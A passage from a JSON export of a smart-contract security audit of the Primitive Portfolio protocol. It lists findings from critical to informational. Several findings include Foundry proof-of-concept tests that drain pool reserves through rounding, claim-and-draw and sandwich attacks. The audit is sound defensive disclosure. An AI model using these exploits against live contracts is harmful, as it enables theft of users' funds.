ghost().balance(actor(), ghost().quote().to_addr()); assertEq(credited, 0, \"token-credit\"); uint256 pre_swap_balance = ghost().quote().to_token().balanceOf(actor()); subject().multiprocess( FVMLib.encodeSwap( uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0) ) ); subject().multiprocess( // claim it all FVMLib.encodeClaim(ghost().poolId, type(uint128).max, type(uint128).max) ); // we got credited tokensOwed = 1% of 1e14 input = 1e12 quote tokens uint256 credited = ghost().balance(actor(), ghost().quote().to_addr()); assertEq(credited, 1e12, \"tokens-owed\"); // can withdraw the credited tokens, would underflow reserve, so just rug the entire reserve reserve_quote = ghost().reserve(ghost().quote().to_addr()); subject().draw(ghost().quote().to_addr(), reserve_quote, actor()); uint256 post_draw_balance = ghost().quote().to_token().balanceOf(actor()); // -amtIn because reserve_quote already got increased by it, otherwise we'd be double-counting assertEq(post_draw_balance, pre_swap_balance + reserve_quote - amtIn, ,! \"post-draw-balance-mismatch\"); 7 } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Swaps can be done for free and steal the reserve given large liquidity allocation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "A swap of inputDelta tokens for outputDelta tokens is accepted if the invariant after the swap did not decrease. The after-swap invariant is recomputed using the pools new virtual reserves (per liquidity) virtualX and virtualY: // becomes virtualX (reserveX) if swapping X -> Y nextIndependent = liveIndependent + deltaInput.divWadDown(iteration.liquidity); // becomes virtualY (reserveY) if swapping X -> Y nextDependent = liveDependent - deltaOutput.divWadDown(iteration.liquidity); // in checkInvariant int256 nextInvariant = RMM01Lib.invariantOf({ self: pools[poolId], R_x: reserveX, R_y: reserveY, timeRemainingSec: tau }); require(nextInvariantWad >= prevInvariant); When iteration.liquidity is sufficiently large the integer division deltaOutput.divWadDown(iteration.liquidity) will return 0, resulting in an unchanged pool reserve instead of a decreased one. The invariant check will pass even without transferring any input amount deltaInput as the reserves are unchanged. The swapper will be credited deltaOutput tokens. The attacker needs to first increase the liquidity to a large amount (>2**126 in the POC) such that they can steal the entire asset reserve (100e18 asset tokens in the POC): This can be done using multiprocess to: 1. allocate > 1.1e38 liquidity. 2. swap with input = 1 (to avoid the 0-swap revert) and output = 100e18. The new virtualX asset will be liveDependent - deltaOutput.divWadDown(iteration.liquidity) = liveDependent computed - 100e18 * 1e18 / 1.1e38 = liveDependent - 0 = liveDependent, leaving the virtual pool reserves unchanged and passing the invariant check. This credits 100e18 to the attacker when settled, as the global reserves (__account__.reserve) are decreased (but not the actual contract balance). as 3. deallocate the > 1.1e38 free liquidity again. As the virtual pool reserves virtualX/Y remained unchanged throughout the swap, the same allocated amount is credited again. Therefore, the allocation / deallocation doesnt require any token settlement. 4. settlement is called and the attacker needs to pay the swap input amount of 1 wei and is credited the global reserve decrease of 100e18 assets from the swap. Note that this attack requires a JIT parameter of zero in order to deallocate in the same block as the allocation. However, given sufficient capital combined with an extreme strike price or future cross-block flashloans, this attack 8 is also possible with JIT > 0. Attackers can perform this attack in their own pool with one malicious token and one token they want to steal. The malicious token comes with functionality to disable anyone else from trading so the attacker is the only one who can interact with their custom pool. This reduces any risk of this attack while waiting for the deallocation in a future block. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"contracts/libraries/RMM01Lib.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { using RMM01Lib for PortfolioPool; // sorry, didn't know how to use the modifiers for testing 2 actors at the same time function test_virtual_reserve_unchanged_bug() public noJit defaultConfig { /////// SETUP /////// uint256 initialBalance = 100 * 1e18; address victim = address(actor()); vm.startPrank(victim); // we want to steal the victim's asset ghost().asset().prepare(address(victim), address(subject()), initialBalance); subject().fund(ghost().asset().to_addr(), initialBalance); vm.stopPrank(); // we need to prepare a tiny quote balance for attacker because we cannot set input = 0 for a swap ,! address attacker = address(0x54321); addGhostActor(attacker); setGhostActor(attacker); vm.startPrank(attacker); ghost().quote().prepare(address(attacker), address(subject()), 2); vm.stopPrank(); uint256 maxVirtual; { // get the virtualX/Y from pool creation PortfolioPool memory pool = ghost().pool(); (uint256 x, uint256 y) = pool.getVirtualPoolReservesPerLiquidityInWad(); console2.log(\"getVirtualPoolReservesPerLiquidityInWad: %s \\t %y \\t %s\", x, y); maxVirtual = y; } /////// ATTACK /////// // attacker provides max liquidity, swaps for free, removes liquidity, is credited funds vm.startPrank(attacker); bool sellAsset = false; uint128 amtIn = 1; uint128 amtOut = uint128(initialBalance); // victim's funds bytes[] memory instructions = new bytes[](3); uint8 counter = 0; instructions[counter++] = FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), poolId: ghost().poolId, // getPoolLiquidityDeltas(int128 deltaLiquidity) does virtualY.mulDivUp(delta, scaleDownFactorAsset).safeCastTo128() ,! // virtualY * deltaLiquidity / 1e18 <= uint128.max => deltaLiquidity <= uint128.max * 1e18 ,! / virtualY. 9 // this will end up supplying deltaLiquidity such that the uint128 cast on deltaQuote won't overflow (deltaQuote ~ uint128.max) ,! // deltaLiquidity = 110267925102637245726655874254617279807 > 2**126 deltaLiquidity: uint128((uint256(type(uint128).max) * 1e18) / maxVirtual) }); // the main issue is that the invariant doesn't change, so the checkInvariant passes // the reason why the invariant doesn't change is because the virtualX/Y doesn't change // the reason why virtualY doesn't change even though we have deltaOutput = initialBalance (100e18) ,! // is that the previous allocate increased the liquidity so much that: // nextDependent = liveDependent - deltaOutput.divWadDown(iteration.liquidity) = liveDependent // the deltaOutput.divWadDown(iteration.liquidity) is 0 because: // 100e18 * 1e18 / 110267925102637245726655874254617279807 = 1e38 / 1.1e38 = 0 instructions[counter++] = FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0)); ,! instructions[counter++] = FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: false, useMax: uint8(1), poolId: ghost().poolId, deltaLiquidity: 0 // useMax makes us deallocate our entire freeLiquidity }); subject().multiprocess(FVM.encodeJumpInstruction(instructions)); uint256 attacker_asset_balance = ghost().balance(attacker, ghost().asset().to_addr()); assertGt(attacker_asset_balance, 0); console2.log(\"attacker asset profit: %s\", attacker_asset_balance); // attacker can withdraw victim's funds, leaving victim unable to withdraw subject().draw(ghost().asset().to_addr(), type(uint256).max, actor()); uint256 attacker_balance = ghost().asset().to_token().balanceOf(actor()); // rounding error of 1 assertEq(attacker_balance, initialBalance - 1, \"attacker-post-draw-balance-mismatch\"); vm.stopPrank(); } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Unsafe type-casting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Throughout the contract weve encountered various unsafe type-castings.  invariant Within the _swap function, the next invariant is a int256 variable and is calculated within the checkInvariant function implemented in the RMM01Portfolio. This variable then is dangerously typecasted to int128 and assigned to a int256 variable in the iteration struct (L539). The down-casting from int256 to int128 assumes that the nextInvariantWad fits in a int128, in case it wont fit, it will overflow. The updated iteration object is passed to the _feeSavingEffects function, which based on the RMM implementation can lead to bad consequences.  iteration.nextInvariant  _getLatestInvariantAndVirtualPrice  getNetBalance During account settlement, getNetBalance is called to compute the difference between the \"physical reserves\" (contract balance) and the internal reserves: net = int256(physicalBalance) - int256(internalBalance). If the internalBalance > int256.max, it overflows into a negative value and the attacker is credited the entire physical balance + overflow upon settlement (and doesnt have to pay anything in settle). This might happen if an attacker allocates or swaps in very high amounts before settlement is called. Consider doing a safe typecast here as a legitimate possible revert would cause less issues than an actual overflow.  getNetBalance 11  Encoding / Decoding functions The encoding and decoding functions in FVMLib perform many unsafe typecasts and will truncate values. This can result in a user calling functions with unexpected parameters if they use a custom encoding. Consider using safe type-casts here.  encodeJumpInstruction: cannot encode more than 255 instructions, instructions will be cut off and they might perform an action that will then be settled unfavorably.  decodeClaim: fee0/fee1 can overflow  decodeCreatePool: price := mul(base1, exp(10, power1)) can overflow and pool is initialized wrong  decodeAllocateOrDeallocate: deltaLiquidity := mul(base, exp(10, power)) can overflow would pro- vide less liquidity  decodeSwap: input / output := mul(base1, exp(10, power1)) can overflow, potentially lead to unfavor- able swaps  Other  PortfolioLib.getPoolReserves: int128(self.liquidity). This could be a safe typecast, the function is not used internally.  AssemblyLib.toAmount: The typecast works if power < 39, otherwise leads to wrong results without revert- ing. This function is not used yet but consider performing a safe typecast here.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Protocol fees are in WAD instead of token decimal units",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "When swapping, deltaInput is in WAD (not token decimals) units. Therefore, the protocolFee will also be in WAD as a percentage of deltaInput. This WAD amount is then credited to the REGISTRY: iteration.feeAmount = (deltaInput * _state.fee) / PERCENTAGE; if (_protocolFee != 0) { uint256 protocolFeeAmount = iteration.feeAmount / _protocolFee; iteration.feeAmount -= protocolFeeAmount; _applyCredit(REGISTRY, _state.tokenInput, protocolFeeAmount); } The privileged registry can claim these fees using a withdrawal (draw) and the WAD units are not scaled back to token decimal units, resulting in withdrawing more fees than they should have received if the token has less than 18 decimals. This will reduce the global reserve by the increased fee amount and break the accounting and functionality of all pools using the token.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Invariant.getX computation is wrong",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The protocol makes use of a solstat library to compute the off-chain swap amounts. The solstats Invariant.getX function documentation states: Computes x in x = 1 - (( (y + k) / K ) + ). However, the y + k term should be y - k. The off-chain swap amounts computed via getAmountOut return wrong values. Using these values for an actual swap transaction will either (wrongly) revert the swap or overstate the output amounts. Derivation: y = K (cid:8) (cid:0)(cid:8)(cid:0)1(1 (cid:8)(cid:0)1(y (cid:0) (cid:8) (cid:0)(cid:8)(cid:0)1(y x) (cid:27)p(cid:28) (cid:1) + k (cid:0) (cid:0) k )=K = (cid:8)(cid:0)1(1 x) (cid:27)p(cid:28) (cid:0) k)=K + (cid:27)p(cid:28) (cid:1) = 1 (cid:0) x (cid:0) (cid:0) (cid:8) (cid:0)(cid:8)(cid:0)1(y x = 1",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Liquidity can be (de-)allocated at a bad price",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "To allocate liquidity to a pool, a single uint128 liquidityDelta parameter is specified. The re- quired deltaAsset and deltaQuote token amounts are computed from the current virtualX and virtualY token reserves per liquidity (prices). An MEV searcher can sandwich the allocation transaction with swaps that move the price in an unfavorable way, such that, the allocation happens at a time when the virtualX and virtualY variables are heavily skewed. The MEV searcher makes a profit and the liquidity provider will automatically be forced to use undesired token amounts. In the provided test case, the MEV searcher makes a profit of 2.12e18 X and the LP uses 9.08e18 X / 1.08 Y instead of the expected 3.08 X / 30.85 Y. LPs will incur a loss, especially if the asset (X) is currently far more valuable than the quote (Y). // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"contracts/libraries/RMM01Lib.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { using RMM01Lib for PortfolioPool; // sorry, didn't know how to use the modifiers for testing 2 actors at the same time function test_allocate_sandwich() public defaultConfig { uint256 initialBalance = 100e18; address victim = address(actor()); address mev = address(0x54321); ghost().asset().prepare(address(victim), address(subject()), initialBalance); ghost().quote().prepare(address(victim), address(subject()), initialBalance); addGhostActor(mev); setGhostActor(mev); vm.startPrank(mev); // need to prank here for approvals in `prepare` to work ghost().asset().prepare(address(mev), address(subject()), initialBalance); ghost().quote().prepare(address(mev), address(subject()), initialBalance); vm.stopPrank(); vm.startPrank(victim); subject().fund(ghost().asset().to_addr(), initialBalance); subject().fund(ghost().quote().to_addr(), initialBalance); vm.stopPrank(); vm.startPrank(mev); subject().fund(ghost().asset().to_addr(), initialBalance); subject().fund(ghost().quote().to_addr(), initialBalance); vm.stopPrank(); // 0. some user provides initial liquidity, so MEV can actually swap in the pool vm.startPrank(victim); subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), 14 poolId: ghost().poolId, deltaLiquidity: 10e18 }) ); vm.stopPrank(); // 1. MEV swaps, changing the virtualX/Y LP price (skewing the reserves) vm.startPrank(mev); uint128 amtIn = 6e18; bool sellAsset = true; uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0))); ,! vm.stopPrank(); // 2. victim allocates { uint256 victim_asset_balance = ghost().balance(victim, ghost().asset().to_addr()); uint256 victim_quote_balance = ghost().balance(victim, ghost().quote().to_addr()); vm.startPrank(victim); subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), poolId: ghost().poolId, deltaLiquidity: 10e18 }) ); vm.stopPrank(); PortfolioPool memory pool = ghost().pool(); (uint256 x, uint256 y) = pool.getVirtualPoolReservesPerLiquidityInWad(); console2.log(\"getVirtualPoolReservesPerLiquidityInWad: %s \\t %y \\t %s\", x, y); victim_asset_balance -= ghost().balance(victim, ghost().asset().to_addr()); victim_quote_balance -= ghost().balance(victim, ghost().quote().to_addr()); console2.log( \"victim used asset/quote for allocate: %s \\t %y \\t %s\", victim_asset_balance, victim_quote_balance ); // w/o sandwich: 3e18 / 30e18 } // 3. MEV swaps back, ending up with more tokens than their initial balance vm.startPrank(mev); sellAsset = !sellAsset; amtIn = amtOut; // @audit-issue this only works after patching Invariant.getX to use y - k. still need to reduce the amtOut a tiny bit because of rounding errors ,! amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)) * (1e4 - 1) / 1e4; subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0))); ,! vm.stopPrank(); uint256 mev_asset_balance = ghost().balance(mev, ghost().asset().to_addr()); uint256 mev_quote_balance = ghost().balance(mev, ghost().quote().to_addr()); assertGt(mev_asset_balance, initialBalance); assertGe(mev_quote_balance, initialBalance); console2.log( \"MEV asset/quote profit: %s \\t %s\", mev_asset_balance - initialBalance, mev_quote_balance - ,! initialBalance ); } 15 }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Missing signextend when dealing with non-full word signed integers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The AssemblyLib is using non-full word signed integers operations. If the signed data in the stack have not been signextend the twos complement arithmetic will not work properly, most probably reverting. The solidity compiler does this cleanup but this cleanup is not guaranteed to be done while using the inline assem- bly.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Tokens With Multiple Addresses Can Be Stolen Due to Reliance on balanceOf",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Some ERC20 tokens have multiple valid contract addresses that serve as entrypoints for manipulat- ing the same underlying storage (such as Synthetix tokens like SNX and sBTC and the TUSD stablecoin). Because the FVM holds all tokens for all pools in the same contract, assumes that a contract address is a unique identifier for a token, and relies on the return value of balanceOf for manipulated tokens to determine what transfers are needed during transaction settlement, multiple entrypoint tokens are not safe to be used in pools. For example, suppose there is a pool with non-zero liquidity where one token has a second valid address. An attacker can atomically create a second pool using the alternate address, allocate liquidity, and then immediately deallocate it. During execution of the _settlement function, getNetBalance will return a positive net balance for the double entrypoint token, crediting the attacker and transferring them the entire balance of the double entrypoint token. This attack only costs gas, as the allocation and deallocation of non-double entrypoint tokens will cancel out.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Swap amounts are always estimated with priority fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "A pool can have a priority fee that is only applied when the pool controller (contract) performs a swap. However, when estimating a swap with getAmountOut the priority fee will always be applied as long as there is a controller and a priority fee. As the priority fee is usually less than the normal fee, the input amount will be underestimated for non-controllers and the input amount will be too low and the swap reverts.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Rounding functions are wrong for negative integers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The AssemblyLib.scaleFromWadUpSigned and AssemblyLib.scaleFromWadDownSigned both work on int256s and therefore also on negative integers. However, the rounding is wrong for these. Rounding down should mean rounding towards negative infinity, and rounding up should mean rounding towards positive infinity. The scaleFromWadDownSigned only performs a truncations, rounding negative integers towards zero. This function is used in checkInvariant to ensure the new invariant is not less than the new invariant in a swap: int256 liveInvariantWad = invariant.scaleFromWadDownSigned(pools[poolId].pair.decimalsQuote); int256 nextInvariantWad = nextInvariant.scaleFromWadDownSigned( pools[poolId].pair.decimalsQuote ); nextInvariantWad >= liveInvariantWad It can happen for quote tokens with fewer decimals, for example, 6 with USDC, that liveInvariantWad was rounded from a positive 0.9999e12 value to zero. And nextInvariantWad was rounded from a negative value of -0.9999e12 to zero. The check passes even though the invariant is violated by almost 2 quote token units.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LPs can lose fees if fee growth accumulator overflows their checkpoint",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Fees (that are not reinvested in the pool) are currently tracked through an accumulator value pool.feeGrowthGlobalAsset and pool.feeGrowthGlobalQuote, computed as asset or quote per liquidity. Each user providing liquidity has a checkpoint of these values from their last sync (claim). When syncing new fees, the distance from the current value to the users checkpoint is computed and multiplied by their liquidity. The accumu- lator values are deliberately allowed to overflow as only the distance matters. However, if an LP does not sync its fees and the accumulator grows, overflows, and grows larger than their last checkpoint, the LP loses all fees. Example:  User allocates at pool.feeGrowthGlobalAsset = 1000e36  pool.feeGrowthGlobalAsset grows and overflows to 0. differenceAsset is still accurate.  pool.feeGrowthGlobalAsset grows more and is now at 1000e36 again. differenceAsset will be zero. If the user only claims their fees now, theyll earn 0 fees.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unnecessary left shift in encodePoolId",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The encodePoolId performs a left shift of 0. This is a noop.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_syncPool performs unnecessary pool state updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The _syncPool function is only called during a swap. During a swap the liquidity never changes and the pools last timestamp has already been updated in _beforeSwapEffects.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Portfolio.sol gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Throughout the contract weve identified a number of minor gas optimizations that can be performed. Weve gathered them into one issue to keep the issue number as small as possible.  L750 The msg.value > 0 check is done also in the __wrapEther__ call  L262 The following substitutions can be optimized in case assets are 0 by moving each instruction within the ifs on lines 256-266 pos.tokensOwedAsset -= claimedAssets.safeCastTo128(); pos.tokensOwedQuote -= claimedQuotes.safeCastTo128();  L376 Consider using the pool object (if it remains as a storage object) instead of pools[args.poolId]  L444:L445 The following two instructions can be grouped into one. output = args.output; output = output.scaleToWad(...  L436:L443 The internalBalance variable can be discarded due to the fact that it is used only within the input assignment. uint256 internalBalance = getBalance( msg.sender, _state.sell ? pool.pair.tokenAsset : pool.pair.tokenQuote ); input = args.useMax == 1 ? internalBalance : args.input; input = input.scaleToWad( _state.sell ? pool.pair.decimalsAsset : pool.pair.decimalsQuote );  L808 Assuming that the swap instruction will be one of the most used instructions, might be worth moving it as first if condition to save gas.  L409 The if (args.input == 0) revert ZeroInput(); can be removed as it will result in iteration.input being zero and reverting on L457.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Incomplete NatSpec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Throughout the IPortofolio.sol interface, various NatSpec comments are missing or incomplete",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate Comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "These comments are inaccurate. [1] The hex value on this line translates to v0.1.0-beta instead of v1.0.0-beta. [2] computeTau returns either the time until pool maturity, or zero if the pool is already expired. [3] These comments do not properly account for the two byte offset from the start of the array (in L94, only in the endpoint of the slice).",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check for priorityFee should have its own custom error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The check for invalid priorityFee within the checkParameters function uses the same custom error as the one for fee. This could lead to confusion in the error output.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unclear @dev comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "This comment is misleading. It implies that cache is used to \"check\" state while it in fact changes it.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused custom error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Unused error error AlreadySettled();",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use named constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The decodeSwap function compares a value against the constant 6. This value indicates the SWAP_- ASSET constant. sellAsset := eq(6, and(0x0F, byte(0, value)))",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "scaleFromWadUp and scaleFromWadUpSigned can underflow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The scaleFromWadUp and scaleFromWadUpSigned will underflow if the amountWad parameter is 0 because they perform an unchecked subtraction on it: outputDec := add(div(sub(amountWad, 1), factor), 1) // ((a-1) / b) + 1",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "AssemblyLib.pack does not clear lowers upper bits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The pack function packs the 4 lower bits of two bytes into a single byte. If the lower parameter has dirty upper bits, they will be mixed with the higher byte and be set on the final return value.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "AssemblyLib.toBytes8/16 functions assumes a max raw length of 16",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The toBytes16 function only works if the length of the bytes raw parameter is at most 16 because of the unchcked subtraction: let shift := mul(sub(16, mload(raw)), 8) The same issue exists for the toBytes8 function.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "PortfolioLib.maturity returns wrong value for perpertual pools",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "A pool can be a perpetual pool that is modeled as a pool with a time to maturity always set to 1 year in the computeTau. However, the maturity function does not return this same maturity. This currently isnt a problem as maturity is only called from computeTau in case it is not a perpetual pool.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "_createPool has incomplete NatSpec and event args",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The _createPool function contains incomplete NatSpec specifications. Furthermore, the event emitted by this function can be improved by adding more arguments.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "_liquidityPolicy is cast to a uint8 but it should be a uint16",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "During _createPool the pool curve parameters are set. One of them is the jit parameter which is a uint16. It can be assigned the default value of _liquidityPolicy but it is cast to a uint8. If the _liquidityPolicy constant is ever changed to a value greater than type(uint8).max a wrong jit value will be assigned.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Update _feeSavingEffects documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The _feeSavingEffects documentation states: @return bool True if the fees were saved in positions owed tokens instead of re-invested.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document checkInvariant and resolve confusing naming",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The checkInvariant functions return values are undocumented and the used variables names are confusing.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Token amounts are in wrong decimals if useMax parameter is used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The allocate and swap functions have a useMax parameter that sets the token amounts to be used to the net balance of the contract. This net balance is the return value of a getNetBalance call, which is in token decimals. The code that follows (getPoolMaxLiquidity for allocate, iteration.input for swap) expects these amounts to be in WAD units. Using this parameter with tokens that don't have 18 decimals does not work correctly. The actual tokens used will be far lower than the expected amount to be used which will lead to user loss as the tokens remain in the contract after the action.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "getAmountOut underestimates outputs leading to losses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "When computing the output, the getAmountOut performs a bisection. However, this bisection returns any root of the function, not the lowest root. As the invariant is far from being strictly monotonic in R_x, it contains many neighbouring roots (> 2e9 in the example) and it's important to return the lowest root, corresponding to the lowest nextDependent, i.e., it leads to a larger output amount amountOut = prevDependent - nextDependent. Users using this function to estimate their outputs can incur significant losses.  Example: Calling getAmountOut(poolId, false, 1, 0, address(0)) with the pool configuration in the example will return amtOut = 123695775, whereas the real max possible amtOut for that swap is 33x higher at 4089008108. The core issue is that invariant is not strictly monotonic, invariant(R_x, R_y) = invariant(R_x + 2_852_- 050_358, R_y), there are many neighbouring roots for the pool configuration: function test_eval() public { uint128 R_y = 56075575; uint128 R_x = 477959654248878758; uint128 stk = 117322822; uint128 vol = 406600000000000000; uint128 tau = 2332800; int256 prev = Invariant.invariant({R_y: R_y, R_x: R_x, stk: stk, vol: vol, tau: tau}); // this is the actual dependent that still satisfies the invariant R_x -= 2_852_050_358; int256 post = Invariant.invariant({R_y: R_y, R_x: R_x, stk: stk, vol: vol, tau: tau}); 25 console2.log(\"prev: %s\", prev); console2.log(\"post: %s\", post); assertEq(post, prev); assertEq(post, 0); }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getAmountOut Calculates an Output Value That Sets the Invariant to Zero, Instead of Preserving Its Value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The swap function enforces that the pool's invariant value does not decrease; however, the getA- mountOut function computes an expected swap output based on setting the pool's invariant to zero, which is only equivalent if the initial value of the invariant was already zero--which will generally not be the case as fees accrue and time passes. This is because in computeSwapStep (invoked by getAmountOut [1]), the func- tion (optimizeDependentReserve) passed [2] to the bisection algorithm for root finding returns just the invariant evaluated on the current arguments [3] instead of the difference between the evaluated and original invariant. As a consequence, getAmountOut will return an inaccurate result when the starting value of the invariant is non-zero, leading to either disadvantageous swaps or swaps that revert, depending on whether the current pool invariant value is less than or greater than zero.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getAmountOut Does Not Adjust The Pool's Reserve Values Based on the liquidityDelta Parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The liquidityDelta parameter allows a caller to adjust the liquidity in a pool before simulating a swap. However, corresponding adjustments are not made to the per-pool reserves, virtualX and virtualY. This makes the reserve-to-liquidity ratios used in the calculations incorrect, leading to inaccurate results (or potentially reverts if the invalid values fall outside of allowed ranges). Use of the inaccurate swap outputs could lead either to swaps at bad prices or swaps that revert unexpectedly.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Bisection always uses max iterations",
